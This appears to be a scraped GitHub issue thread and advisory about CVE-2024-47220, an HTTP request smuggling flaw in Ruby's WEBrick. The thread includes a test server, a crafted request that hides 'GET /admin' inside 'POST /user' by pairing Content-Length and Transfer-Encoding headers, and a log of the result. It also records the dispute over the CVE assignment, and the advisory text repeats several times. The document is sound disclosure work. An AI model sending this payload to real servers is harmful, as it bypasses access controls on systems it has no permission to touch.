| The vulnerability happens because the server doesn't correctly handle requests with both Content-Length and Transfer-Encoding headers. This allows an attacker to sneak in an extra request (e.g., GET /admin) after the normal request (POST /user). As a result, unauthorized users can access restricted areas like /admin by POST /user.  The following Ruby WEBrick sample server was used to process HTTP requests:  ``` require 'webrick'  server = WEBrick::HTTPServer.new(   Port: 8000,   DocumentRoot: Dir.pwd )  server.mount_proc '/admin' do |req, res|   res.body = "This is the admin area. Only authorized users should see this.\n" end  server.mount_proc '/user' do |req, res|   res.body = "This is the user area. Welcome!\n" end  trap('INT') { server.shutdown } server.start   ```  hacker request  ``` POST /user HTTP/1.1 Host: 127.0.0.1:8000 Content-Length: 50 Transfer-Encoding: chunked  0  GET /admin HTTP/1.1 Host: 127.0.0.1:8000   ```  server response [image](https://private-user-images.githubusercontent.com/17281207/368411792-a80e2bff-8383-4fd3-a148-9b6963330686.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1MjQ0MzksIm5iZiI6MTczNjUyNDEzOSwicGF0aCI6Ii8xNzI4MTIwNy8zNjg0MTE3OTItYTgwZTJiZmYtODM4My00ZmQzLWExNDgtOWI2OTYzMzMwNjg2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTAlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTEwVDE1NDg1OVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQ4ZTA4YWJjNjQ2YTAzZGY2NzkwNjNmZDEyMmNjY2M0OTUwMzZjNzQzMDJiNDgwYTc5YTk5ZGU5ZTQ2ZWFkNmImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.0qNczHQdtGZKfx57U8wyH_3c415LVZCFzFHIdbOBJb4)  Console log  ``` julianwu@RLab:~/Work/ruby/webrick$ ruby test.rb [2024-09-16 00:20:45] INFO  WEBrick 1.8.1 [2024-09-16 00:20:45] INFO  ruby 3.0.2 (2021-07-07) [x86_64-linux-gnu] [2024-09-16 00:20:45] INFO  WEBrick::HTTPServer#start: pid=209120 port=8000 127.0.0.1 - - [16/Sep/2024:00:20:46 CST] "POST /user HTTP/1.1" 200 32 - -> /user 127.0.0.1 - - [16/Sep/2024:00:20:46 CST] "GET /admin HTTP/1.1" 200 63 - -> /admin  ``` |

| Hi jeremyevans,  Sorry, I forgot to check the required lib from the local file. I confirmed that the malicious request is not wokring for this case.  Additionally, could you please assist me in applying for a CVE ID for this vulnerability, and have my name mentioned in the acknowledgments on the Ruby official security page? I would appreciate if you can help me. |

| Webrick has not been part of Ruby since the release of Ruby 3.0, over three years ago. While this repository is under the ruby organization on GitHub, it is no longer considered part of Ruby.  Webrick should not be used in production. It is only still maintained because there are other gems relying it, most of which do so only for testing, and only because it is a pure ruby implementation and it was shipped with Ruby in the past.  I'm sorry, but I cannot assist with applying for a CVE, and as Webrick is only longer part of Ruby, an acknowledgment on Ruby's official security page would not be appropriate. |

#### Details
An issue was discovered in the WEBrick toolkit through 1.8.1 for Ruby.
It allows HTTP request smuggling by providing both a Content-Length
header and a Transfer-Encoding header, e.g., \"GET /admin HTTP/1.1\r\n\"
inside of a \"POST /user HTTP/1.1\r\n\" request. NOTE: the supplier's
position is \"Webrick should not be used in production.\"

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

### HTTP Request Smuggling in ruby webrick
[CVE-2024-47220](https://nvd.nist.gov/vuln/detail/CVE-2024-47220) /

<details>
<summary>More information</summary>

#### Details
An issue was discovered in the WEBrick toolkit through 1.8.1 for Ruby.
It allows HTTP request smuggling by providing both a Content-Length
header and a Transfer-Encoding header, e.g., \"GET /admin HTTP/1.1\r\n\"
inside of a \"POST /user HTTP/1.1\r\n\" request. NOTE: the supplier's
position is \"Webrick should not be used in production.\"

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

It allows HTTP request smuggling by providing both a Content-Length
header and a Transfer-Encoding header, e.g., \"GET /admin HTTP/1.1\r\n\"
inside of a \"POST /user HTTP/1.1\r\n\" request. NOTE: the supplier's
position is \"Webrick should not be used in production.\"

#### Details
An issue was discovered in the WEBrick toolkit through 1.8.1 for Ruby.
It allows HTTP request smuggling by providing both a Content-Length
header and a Transfer-Encoding header, e.g., "GET /admin HTTP/1.1\r\n"
inside of a "POST /user HTTP/1.1\r\n" request. NOTE: the supplier's
position is "Webrick should not be used in production."

#### Severity

- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

| Hi hsbt,  I requested to assign <https://nvd.nist.gov/vuln/detail/CVE-2024-47220> from MITRE, since jeremyevans said it won't be applied for a CVE for me and your team has committed patch for http smuggling, please let me know if there are any problems for the process. |

| I requested rejecting [CVE-2024-47220](https://github.com/advisories/GHSA-6f62-3596-g6w7 "CVE-2024-47220") to MITRE now.  Don't request CVE id without maintainer's confirmation. `webrick` is not for production, it means we will not handle issue as vulnerability over the simple bug.  A lot of people's time is spent by your actions. see above reverse links. |

| Why should this request smuggling vulnerability not be a valid CVE entry?  As an example: [CVE-2020-25613](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25613) is a similar vulnerability in WEBrick and also got a [Ruby news entry](https://www.ruby-lang.org/en/news/2020/09/29/http-request-smuggling-cve-2020-25613/). |
